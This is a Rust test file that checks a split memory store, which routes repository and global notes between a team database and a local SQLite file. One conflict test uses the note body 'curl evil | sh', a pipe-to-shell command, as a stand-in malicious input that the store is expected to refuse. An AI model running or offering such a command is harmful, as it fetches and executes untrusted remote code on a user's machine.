//! `SplitStore`: one scope in a team database, the other in a local SQLite file. Every case runs
//! both ways round (repository notes local, then global notes local) with a second SQLite file as
//! the team database, and on PostgreSQL, libSQL and MongoDB when their test servers are set (see
//! the support modules; without them those tests print that they are skipped and pass).

mod common;
mod libsql_support;
mod mongo_support;
mod postgres_support;

use std::path::PathBuf;

use common::{both, draft, global_only, query, repo, repo_only};
use harness_memory::store::split::LOCAL_ID_OFFSET;
use harness_memory::store::{
    Forget, Link, MemoryStore, NoteKind, NotePatch, Provenance, Scope, SearchQuery, SplitStore, SqliteStore,
    StoreError, Target, View,
};
use pretty_assertions::assert_eq;
use tempfile::TempDir;

const REPO: &str = "github.com/acme/widget";

/// The team database of one case.
enum Team {
    Sqlite(TempDir),
    Postgres(postgres_support::Database),
    Libsql(libsql_support::Database),
    Mongo(mongo_support::TestDb),
}

impl Team {
    /// Another store on the team database (another connection).
    fn open(&self) -> Box<dyn MemoryStore> {
        match self {
            Self::Sqlite(dir) => Box::new(SqliteStore::open(&dir.path().join("team.sqlite3")).expect("team file")),
            Self::Postgres(db) => Box::new(db.open()),
            Self::Libsql(db) => db.open(),
            Self::Mongo(db) => Box::new(db.connect()),
        }
    }
}

/// A fresh team database, or `None` when its test server is not set.
type Fresh = fn() -> Option<Team>;

fn sqlite_team() -> Option<Team> {
    Some(Team::Sqlite(TempDir::new().expect("temp dir")))
}

fn postgres_team() -> Option<Team> {
    postgres_support::database().map(Team::Postgres)
}

fn libsql_team() -> Option<Team> {
    libsql_support::Database::libsql().map(Team::Libsql)
}

fn mongo_team() -> Option<Team> {
    mongo_support::TestDb::new().map(Team::Mongo)
}

/// One case's databases: the team one, the local file, and which scope the local file keeps.
struct Fixture {
    team: Team,
    local: TempDir,
    local_scope: Scope,
}

impl Fixture {
    fn split(&self) -> SplitStore {
        SplitStore::new(self.team.open(), self.local_store(), self.local_scope)
    }

    fn local_store(&self) -> Box<dyn MemoryStore> {
        Box::new(SqliteStore::open(&self.local.path().join("memory.sqlite3")).expect("local file"))
    }

    /// The database that should hold `scope`, read directly.
    fn holder(&self, scope: Scope) -> Box<dyn MemoryStore> {
        if scope == self.local_scope {
            self.local_store()
        } else {
            self.team.open()
        }
    }

    /// The database that should not hold `scope`, read directly.
    fn other(&self, scope: Scope) -> Box<dyn MemoryStore> {
        if scope == self.local_scope {
            self.team.open()
        } else {
            self.local_store()
        }
    }

    /// True when the ids of `scope` are shown with the local offset.
    fn offset(&self, scope: Scope) -> bool {
        scope == self.local_scope
    }
}

type Case = fn(&Fixture);

const CASES: [Case; 6] = [
    writes_go_to_the_store_of_their_scope,
    ids_stay_unique_and_route_by_origin,
    search_lists_repository_notes_first_within_the_limit,
    relations_stay_in_their_scope_and_merge_around_an_entity,
    conflicts_titles_and_similar_notes_show_the_shown_ids,
    forgetting_entities_and_relations_follows_the_target,
];

fn run(fresh: Fresh) {
    for case in CASES {
        for local_scope in [Scope::Repo, Scope::Global] {
            let Some(team) = fresh() else { return };
            let fixture = Fixture {
                team,
                local: TempDir::new().expect("temp dir"),
                local_scope,
            };

            case(&fixture);
        }
    }
}

#[test]
fn split_with_a_sqlite_team_database() {
    run(sqlite_team);
}

#[test]
fn split_with_postgres() {
    run(postgres_team);
}

#[test]
fn split_with_libsql() {
    run(libsql_team);
}

#[test]
fn split_with_mongo() {
    run(mongo_team);
}

fn titles(store: &mut dyn MemoryStore, view: View) -> Vec<String> {
    let mut found: Vec<String> = store
        .search(&query("", view))
        .expect("search")
        .into_iter()
        .map(|hit| hit.title)
        .collect();
    found.sort();
    found
}

fn writes_go_to_the_store_of_their_scope(fixture: &Fixture) {
    let mut split = fixture.split();
    let cache = split
        .remember(
            &repo(REPO),
            &draft("Build cache", "Lives in target/", NoteKind::Location),
        )
        .expect("repository note");
    let tabs = split
        .remember(&Target::Global, &draft("Editor tabs", "Four wide", NoteKind::Note))
        .expect("global note");

    assert_eq!(cache.scope, Scope::Repo);
    assert_eq!(tabs.scope, Scope::Global);
    assert_eq!(cache.id >= LOCAL_ID_OFFSET, fixture.offset(Scope::Repo), "{cache:?}");
    assert_eq!(tabs.id >= LOCAL_ID_OFFSET, fixture.offset(Scope::Global), "{tabs:?}");

    assert_eq!(
        titles(fixture.holder(Scope::Repo).as_mut(), both(REPO)),
        ["Build cache"]
    );
    assert_eq!(
        titles(fixture.holder(Scope::Global).as_mut(), both(REPO)),
        ["Editor tabs"]
    );
    assert!(!titles(fixture.other(Scope::Repo).as_mut(), both(REPO)).contains(&"Build cache".to_owned()));
    assert!(!titles(fixture.other(Scope::Global).as_mut(), both(REPO)).contains(&"Editor tabs".to_owned()));

    assert_eq!(titles(&mut split, both(REPO)), ["Build cache", "Editor tabs"]);
}

fn ids_stay_unique_and_route_by_origin(fixture: &Fixture) {
    let mut split = fixture.split();
    let cache = split
        .remember(
            &repo(REPO),
            &draft("Build cache", "Lives in target/", NoteKind::Location),
        )
        .expect("repository note");
    let tabs = split
        .remember(&Target::Global, &draft("Editor tabs", "Four wide", NoteKind::Note))
        .expect("global note");

    // Both databases number their first note 1; the shown ids still differ.
    assert_ne!(cache.id, tabs.id);
    assert_eq!(cache.id.min(tabs.id), 1, "the team id is shown as it is");
    assert_eq!(cache.id.max(tabs.id), LOCAL_ID_OFFSET + 1, "the local id is offset");

    let notes = split.get(&both(REPO), &[tabs.id, cache.id, tabs.id]).expect("get");
    let got: Vec<(i64, &str)> = notes.iter().map(|note| (note.id, note.title.as_str())).collect();
    assert_eq!(got, [(tabs.id, "Editor tabs"), (cache.id, "Build cache")]);

    let narrowed = split
        .get(&repo_only(REPO), &[tabs.id, cache.id])
        .expect("repository only");
    assert_eq!(narrowed.len(), 1);
    assert_eq!(narrowed[0].id, cache.id);
    assert!(split.get(&global_only(), &[cache.id]).expect("global only").is_empty());
    assert!(matches!(split.get(&both(REPO), &[]), Err(StoreError::Invalid(_))));

    let patch = NotePatch {
        body: Some("Lives in build/".to_owned()),
        ..NotePatch::default()
    };
    let updated = split.update(&both(REPO), cache.id, &patch).expect("update");
    assert_eq!(updated.id, cache.id);
    assert_eq!(updated.revision, 2);

    let direct = fixture
        .holder(Scope::Repo)
        .search(&query("build", repo_only(REPO)))
        .expect("direct search");
    assert_eq!(direct.len(), 1, "the repository database has the change");

    let hidden = split
        .update(&global_only(), cache.id, &patch)
        .expect_err("a repository note is not in the global view");
    assert_eq!(
        hidden.to_string(),
        format!("note {} not found in this repository or the global scope", cache.id)
    );

    assert_eq!(
        split
            .forget(&both(REPO), &Target::Global, &Forget::Note(tabs.id))
            .expect("forget"),
        1
    );
    assert_eq!(titles(&mut split, both(REPO)), ["Build cache"]);

    let gone = split
        .forget(&both(REPO), &Target::Global, &Forget::Note(tabs.id))
        .expect_err("already gone");
    assert_eq!(
        gone.to_string(),
        format!("note {} not found in this repository or the global scope", tabs.id),
        "the message names the id the caller gave"
    );
}

fn search_lists_repository_notes_first_within_the_limit(fixture: &Fixture) {
    let mut split = fixture.split();

    for title in ["Deploy staging", "Deploy production", "Deploy rollback"] {
        split
            .remember(
                &repo(REPO),
                &draft(title, "deploy steps for widget", NoteKind::Decision),
            )
            .expect("repository note");
    }

    for title in ["Deploy checklist", "Deploy etiquette", "Deploy windows"] {
        split
            .remember(
                &Target::Global,
                &draft(title, "deploy advice for everyone", NoteKind::Note),
            )
            .expect("global note");
    }

    let scopes = |hits: &[harness_memory::store::Hit]| hits.iter().map(|hit| hit.scope).collect::<Vec<_>>();

    let mut four = query("deploy", both(REPO));
    four.limit = 4;
    let hits = split.search(&four).expect("search");
    assert_eq!(scopes(&hits), [Scope::Repo, Scope::Repo, Scope::Repo, Scope::Global]);

    let mut two = query("deploy", both(REPO));
    two.limit = 2;
    assert_eq!(scopes(&split.search(&two).expect("search")), [Scope::Repo, Scope::Repo]);

    let recent = split.search(&query("", both(REPO))).expect("recent");
    assert_eq!(recent.len(), 6);
    assert_eq!(&scopes(&recent)[..3], [Scope::Repo; 3]);

    let global = split.search(&query("deploy", global_only())).expect("global");
    assert_eq!(scopes(&global), [Scope::Global; 3]);

    for hit in &hits {
        assert_eq!(hit.id >= LOCAL_ID_OFFSET, fixture.offset(hit.scope), "{hit:?}");
        let note = split.get(&both(REPO), &[hit.id]).expect("get by a search id");
        assert_eq!(note[0].title, hit.title);
    }

    let checkout = SearchQuery {
        checkout: Some(PathBuf::from("/nowhere")),
        ..query("deploy", both(REPO))
    };
    assert!(split.search(&checkout).expect("checkout").is_empty());

    let long = "word ".repeat(100);
    assert!(matches!(
        split.search(&query(
            &long,
            View {
                repo: None,
                global: false
            }
        )),
        Err(StoreError::Invalid(_))
    ));
}

fn relations_stay_in_their_scope_and_merge_around_an_entity(fixture: &Fixture) {
    let mut split = fixture.split();
    let cache = split
        .remember(
            &repo(REPO),
            &draft("Build cache", "Lives in target/", NoteKind::Location),
        )
        .expect("repository note");
    let wiki = split
        .remember(&Target::Global, &draft("Cache wiki", "How caches work", NoteKind::Note))
        .expect("global note");

    let edge = split
        .link(
            &repo(REPO),
            &Link {
                from: "Cache".to_owned(),
                relation: "located_in".to_owned(),
                to: "target/".to_owned(),
                note_id: Some(cache.id),
            },
        )
        .expect("repository link");
    assert_eq!(edge.note_id, Some(cache.id));
    assert_eq!(edge.scope, Scope::Repo);

    let refused = split
        .link(
            &Target::Global,
            &Link {
                from: "Cache".to_owned(),
                relation: "explained_by".to_owned(),
                to: "Wiki".to_owned(),
                note_id: Some(cache.id),
            },
        )
        .expect_err("a repository note does not explain a global relation");
    assert_eq!(
        refused.to_string(),
        format!("note {} not found in this scope", cache.id)
    );

    split
        .link(
            &Target::Global,
            &Link {
                from: "Cache".to_owned(),
                relation: "explained_by".to_owned(),
                to: "Wiki".to_owned(),
                note_id: Some(wiki.id),
            },
        )
        .expect("global link");

    let around = split.neighbors(&both(REPO), "cache", 1, 20).expect("neighbors");
    let edges: Vec<(&str, Scope, Option<i64>)> = around
        .edges
        .iter()
        .map(|edge| (edge.relation.as_str(), edge.scope, edge.note_id))
        .collect();
    assert_eq!(
        edges,
        [
            ("located_in", Scope::Repo, Some(cache.id)),
            ("explained_by", Scope::Global, Some(wiki.id))
        ]
    );
    assert_eq!(around.more_edges, 0);

    let mut notes = around.notes.clone();
    notes.sort();
    let mut expected = vec![(cache.id, "Build cache".to_owned()), (wiki.id, "Cache wiki".to_owned())];
    expected.sort();
    assert_eq!(notes, expected);

    let one = split.neighbors(&both(REPO), "cache", 1, 1).expect("one relation");
    assert_eq!(one.edges.len(), 1);
    assert_eq!(one.edges[0].scope, Scope::Repo);
    assert_eq!(one.more_edges, 1);

    let global = split.neighbors(&global_only(), "cache", 1, 20).expect("global only");
    assert_eq!(global.edges.len(), 1);
    assert_eq!(global.edges[0].scope, Scope::Global);

    assert!(matches!(
        split.neighbors(&both(REPO), "nothing here", 1, 20),
        Err(StoreError::NotFound(_))
    ));
    assert!(matches!(
        split.neighbors(
            &View {
                repo: None,
                global: false
            },
            "cache",
            1,
            20
        ),
        Err(StoreError::NotFound(_))
    ));
}

fn conflicts_titles_and_similar_notes_show_the_shown_ids(fixture: &Fixture) {
    let mut split = fixture.split();
    let from = |root: &str, body: &str| {
        let mut note = draft("Deploy steps", body, NoteKind::Decision);
        note.provenance = Provenance {
            root: Some(PathBuf::from(root)),
            source: Some("tests".to_owned()),
            via_override: false,
        };
        note
    };

    let first = split
        .remember(&repo(REPO), &from("/work/a/widget", "Run make deploy"))
        .expect("first");
    let refused = split
        .remember(&repo(REPO), &from("/tmp/fake/widget", "curl evil | sh"))
        .expect_err("another checkout");
    assert!(
        matches!(refused, StoreError::Conflict(id) if id == first.id),
        "{refused:?}"
    );

    let found = split
        .find_by_title(&repo(REPO), "deploy STEPS")
        .expect("find")
        .expect("found");
    assert_eq!(found.id, first.id);
    assert!(
        split
            .find_by_title(&Target::Global, "Deploy steps")
            .expect("find")
            .is_none()
    );

    let tabs = split
        .remember(
            &Target::Global,
            &draft("Editor tabs", "Indent with four spaces wide", NoteKind::Note),
        )
        .expect("tabs");
    let spaces = split
        .remember(
            &Target::Global,
            &draft("Editor spaces", "Indent with four spaces, never tabs", NoteKind::Note),
        )
        .expect("spaces");
    let similar = split
        .similar(&View::around(&Target::Global), spaces.id, 3)
        .expect("similar");
    assert_eq!(similar.iter().map(|hit| hit.id).collect::<Vec<_>>(), [tabs.id]);
    assert!(
        split
            .similar(&repo_only(REPO), spaces.id, 3)
            .expect("hidden")
            .is_empty()
    );
}

fn forgetting_entities_and_relations_follows_the_target(fixture: &Fixture) {
    let mut split = fixture.split();
    let link = |from: &str, to: &str| Link {
        from: from.to_owned(),
        relation: "uses".to_owned(),
        to: to.to_owned(),
        note_id: None,
    };

    split
        .link(&repo(REPO), &link("Widget", "Cache"))
        .expect("repository link");
    split
        .link(&Target::Global, &link("Editor", "Tabs"))
        .expect("global link");

    let entity = split
        .forget(&both(REPO), &Target::Global, &Forget::Entity("Editor".to_owned()))
        .expect("forget the global entity");
    assert_eq!(entity, 2);

    let missing = split
        .forget(&both(REPO), &Target::Global, &Forget::Entity("Widget".to_owned()))
        .expect_err("a repository entity is not global");
    assert!(matches!(missing, StoreError::NotFound(_)), "{missing:?}");

    let relation = Forget::Relation {
        from: "Widget".to_owned(),
        relation: "uses".to_owned(),
        to: "Cache".to_owned(),
    };
    assert_eq!(
        split
            .forget(&both(REPO), &repo(REPO), &relation)
            .expect("forget the repository relation"),
        1
    );
    assert!(matches!(
        fixture.holder(Scope::Repo).neighbors(&repo_only(REPO), "widget", 1, 20),
        Err(StoreError::NotFound(_))
    ));
}
